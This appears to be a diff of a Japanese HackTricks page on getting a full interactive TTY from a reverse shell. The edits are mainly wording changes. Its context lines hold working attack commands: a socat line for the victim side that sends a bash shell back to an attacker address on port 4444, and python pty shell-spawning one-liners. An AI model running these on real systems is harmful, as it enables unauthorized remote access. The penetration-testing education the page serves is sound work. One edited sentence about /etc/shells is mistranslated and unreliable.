@@ -10,14 +10,14 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
 
 ## フルTTY
 
-`SHELL`変数に設定するシェルは、必ず_**/etc/shells**_に**リストされている必要があります**。そうでない場合は、「SHELL変数の値が/etc/shellsファイルに見つかりませんでした。このインシデントは報告されました」と表示されます。また、次のスニペットはbashでのみ動作することに注意してください。zshにいる場合は、`bash`を実行してbashに切り替えてからシェルを取得してください。
+`SHELL`変数に設定するシェルは、**必ず**_**/etc/shells**_に**リストされている必要があります**。また、`SHELL`変数の値が/etc/shellsファイルに見つかりませんでした。このインシデントは報告されています。次のスニペットはbashでのみ動作することに注意してください。zshにいる場合は、`bash`を実行してシェルを取得する前にbashに変更してください。
 
 #### Python
 
@@ -50,7 +50,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-### **シェルを生成する**
+### **シェルの生成**
 
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
 * `echo os.system('/bin/bash')`
@@ -112,13 +112,13 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
-## ペネロペ
+## Penelope
 
-Penelope (https://github.com/brightio/penelope) は、Linux リバースシェルを自動的に TTY にアップグレードし、ターミナルサイズを処理し、すべてをログに記録し、さらに多くの機能を提供します。また、Windows シェルのための readline サポートも提供します。
+[Penelope](https://github.com/brightio/penelope) は、Linux リバースシェルを自動的に TTY にアップグレードし、ターミナルサイズを処理し、すべてをログに記録し、さらに多くの機能を提供します。また、Windows シェルのための readline サポートも提供します。
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
-## TTYなし
+## No TTY
 
 何らかの理由で完全な TTY を取得できない場合でも、**ユーザー入力を期待するプログラムと対話することができます**。次の例では、パスワードが `sudo` に渡されてファイルを読み取ります：
 ```bash
